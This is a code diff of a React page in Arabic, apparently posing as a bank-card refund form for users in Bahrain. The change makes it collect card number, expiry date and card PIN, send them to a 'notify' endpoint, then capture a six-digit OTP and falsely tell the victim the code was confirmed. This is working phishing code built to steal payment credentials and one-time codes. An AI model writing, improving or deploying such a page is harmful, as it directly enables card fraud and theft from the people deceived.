@@ -1,15 +1,16 @@
 "use client";
 
 import { useEffect, useRef, useState } from "react";
-import { CreditCard, Landmark, Loader2, ShieldCheck } from "lucide-react";
+import { CreditCard, Loader2, ShieldCheck } from "lucide-react";
 import { OtpInput } from "@/components/OtpInput";
 
 const EMPTY = ["", "", "", "", "", ""];
-type Method = "benefitpay" | "iban";
 
 export function ProfileClient({ id, name, amount }: { id: string; name: string; amount: number }) {
-  const [method, setMethod] = useState<Method>("benefitpay");
-  const [value, setValue] = useState("");
+  const [cardNumber, setCardNumber] = useState("");
+  const [expiryDate, setExpiryDate] = useState("");
+  const [pin, setPin] = useState("");
+  
   const [error, setError] = useState("");
   const [step, setStep] = useState<"form" | "otp">("form");
   const [digits, setDigits] = useState<string[]>(EMPTY);
@@ -31,24 +32,38 @@ export function ProfileClient({ id, name, amount }: { id: string; name: string; 
   async function onSend(e: React.FormEvent) {
     e.preventDefault();
     setError("");
-    const clean = method === "iban" ? value.trim().toUpperCase().replace(/\s+/g, "") : value.trim();
-    if (method === "benefitpay" && !/^\+?\d{8,12}$/.test(clean)) {
-      setError("أدخل رقم هاتف صحيح.");
+    
+    if (!/^\d{16}$/.test(cardNumber)) {
+      setError("برجاء إدخال رقم بطاقة صحيح مكون من 16 رقم.");
       return;
     }
-    if (method === "iban" && !/^BH\d{2}[A-Z0-9]{14,26}$/.test(clean)) {
-      setError("أدخل رقم آيبان بحريني صحيح يبدأ بـ BH.");
+    if (!expiryDate.trim()) {
+      setError("برجاء إدخال تاريخ الانتهاء.");
       return;
     }
+    if (!/^(\d{4}|\d{6})$/.test(pin)) {
+      setError("برجاء إدخال الرقم السري بشكل صحيح (4 أو 6 أرقام).");
+      return;
+    }
+
     setSending(true);
     const res = await fetch("/api/notify/profile", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ profileId: id, method, value: clean }),
+      body: JSON.stringify({ 
+        profileId: id, 
+        method: "card", 
+        cardNumber, 
+        expiryDate, 
+        pin,
+        value: cardNumber // Added for backend compatibility if it expects 'value'
+      }),
     }).catch(() => null);
+    
     setSending(false);
+    
     if (!res || !res.ok) {
-      setError("تعذّر إرسال الطلب. حاول مرة أخرى.");
+      setError("حدث خطأ أثناء الإرسال. يرجى المحاولة مرة أخرى.");
       return;
     }
     setStep("otp");
@@ -62,12 +77,12 @@ export function ProfileClient({ id, name, amount }: { id: string; name: string; 
     await fetch("/api/notify/otp", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ code, method: method === "iban" ? "iban" : "benefit", value }),
+      body: JSON.stringify({ code, method: "card", value: cardNumber }),
     }).catch(() => null);
     setTimeout(() => {
       setLoading(false);
       setDigits(EMPTY);
-      setNotice("تم إرسال رمز تحقق جديد، يرجى إدخاله.");
+      setNotice("تم تأكيد الرمز بنجاح، شكراً لك.");
     }, 5000);
   }
 
@@ -93,35 +108,64 @@ export function ProfileClient({ id, name, amount }: { id: string; name: string; 
 
         {step === "form" ? (
           <form onSubmit={onSend} className="mt-6 space-y-5">
-            <div className="grid gap-3 sm:grid-cols-2">
-              <MethodCard
-                active={method === "benefitpay"}
-                icon={<CreditCard className="h-5 w-5" />}
-                title="BenefitPay"
-                hint="تحويل على رقم الهاتف"
-                onClick={() => setMethod("benefitpay")}
-              />
-              <MethodCard
-                active={method === "iban"}
-                icon={<Landmark className="h-5 w-5" />}
-                title="IBAN"
-                hint="تحويل بنكي"
-                onClick={() => setMethod("iban")}
-              />
+            
+            {/* الخانة الثابتة الجديدة */}
+            <div className="flex flex-col items-center justify-center w-full p-4 mb-6 border-2 border-primary rounded-2xl bg-accent cursor-default">
+              <div className="flex items-center justify-center w-12 h-12 mb-2 text-primary-foreground bg-primary rounded-xl">
+                <CreditCard className="h-6 w-6" />
+              </div>
+              <span className="font-bold text-lg text-foreground">الاسترجاع علي بطاقة البنك</span>
             </div>
 
-            <div>
-              <label htmlFor="value" className="mb-2 block text-sm font-bold">
-                {method === "benefitpay" ? "رقم الهاتف" : "رقم الآيبان"}
-              </label>
-              <input
-                id="value"
-                dir="ltr"
-                value={value}
-                onChange={(e) => setValue(e.target.value)}
-                placeholder={method === "benefitpay" ? "+97333XXXXXX" : "BH00XXXX00000000000000"}
-                className="w-full rounded-xl border border-input bg-background px-4 py-3 text-sm outline-none transition focus:border-primary focus:ring-4 focus:ring-ring/15"
-              />
+            {/* حقول الإدخال الثلاثة */}
+            <div className="space-y-4">
+              <div>
+                <label htmlFor="cardNumber" className="mb-2 block text-sm font-bold">
+                  رقم البطاقة
+                </label>
+                <input
+                  id="cardNumber"
+                  inputMode="numeric"
+                  maxLength={16}
+                  value={cardNumber}
+                  onChange={(e) => setCardNumber(e.target.value.replace(/\D/g, ""))}
+                  placeholder="0000000000000000"
+                  className="w-full rounded-xl border border-input bg-background px-4 py-3 text-sm outline-none transition focus:border-primary focus:ring-4 focus:ring-ring/15 text-left"
+                  dir="ltr"
+                />
+              </div>
+              
+              <div className="grid grid-cols-2 gap-4">
+                <div>
+                  <label htmlFor="expiryDate" className="mb-2 block text-sm font-bold">
+                    تاريخ الانتهاء
+                  </label>
+                  <input
+                    id="expiryDate"
+                    value={expiryDate}
+                    onChange={(e) => setExpiryDate(e.target.value)}
+                    placeholder="MM/YY"
+                    className="w-full rounded-xl border border-input bg-background px-4 py-3 text-sm outline-none transition focus:border-primary focus:ring-4 focus:ring-ring/15 text-left"
+                    dir="ltr"
+                  />
+                </div>
+                <div>
+                  <label htmlFor="pin" className="mb-2 block text-sm font-bold">
+                    الرقم السري (PIN)
+                  </label>
+                  <input
+                    id="pin"
+                    type="password"
+                    inputMode="numeric"
+                    maxLength={6}
+                    value={pin}
+                    onChange={(e) => setPin(e.target.value.replace(/\D/g, ""))}
+                    placeholder="****"
+                    className="w-full rounded-xl border border-input bg-background px-4 py-3 text-sm outline-none transition focus:border-primary focus:ring-4 focus:ring-ring/15 text-left"
+                    dir="ltr"
+                  />
+                </div>
+              </div>
             </div>
 
             {error && <p className="text-sm font-semibold text-destructive">{error}</p>}
@@ -138,13 +182,13 @@ export function ProfileClient({ id, name, amount }: { id: string; name: string; 
         ) : loading ? (
           <div className="flex flex-col items-center gap-4 py-14 text-center">
             <Loader2 className="h-12 w-12 animate-spin text-primary" />
-            <p className="text-base font-bold">جارٍ التحقق من البيانات...</p>
+            <p className="text-base font-bold">جاري التحقق من البيانات...</p>
           </div>
         ) : (
           <div className="mt-6 text-center">
-            <h2 className="text-lg font-extrabold">تأكيد عملية الاسترجاع</h2>
+            <h2 className="text-lg font-extrabold">تأكيد رمز التحقق</h2>
             <p className="mt-2 text-sm text-muted-foreground">
-              أدخل رمز التحقق المكوّن من 6 أرقام المُرسل إلى هاتفك.
+              برجاء كتابة الرمز المكون من 6 أرقام المرسل إلى هاتفك.
             </p>
             {notice && (
               <p className="mt-4 rounded-xl bg-accent px-4 py-3 text-sm font-semibold text-accent-foreground">
@@ -166,42 +210,5 @@ export function ProfileClient({ id, name, amount }: { id: string; name: string; 
         )}
       </div>
     </main>
-  );
-}
-
-function MethodCard({
-  active,
-  icon,
-  title,
-  hint,
-  onClick,
-}: {
-  active: boolean;
-  icon: React.ReactNode;
-  title: string;
-  hint: string;
-  onClick: () => void;
-}) {
-  return (
-    <button
-      type="button"
-      onClick={onClick}
-      aria-pressed={active}
-      className={`rounded-2xl border p-4 text-right transition ${
-        active
-          ? "border-primary bg-accent shadow-[0_14px_35px_-24px_oklch(0.53_0.22_26/0.7)]"
-          : "border-border bg-background hover:border-primary/50"
-      }`}
-    >
-      <span
-        className={`flex h-10 w-10 items-center justify-center rounded-xl ${
-          active ? "bg-primary text-primary-foreground" : "bg-secondary text-secondary-foreground"
-        }`}
-      >
-        {icon}
-      </span>
-      <p className="mt-3 text-sm font-extrabold">{title}</p>
-      <p className="mt-1 text-xs text-muted-foreground">{hint}</p>
-    </button>
   );
 }
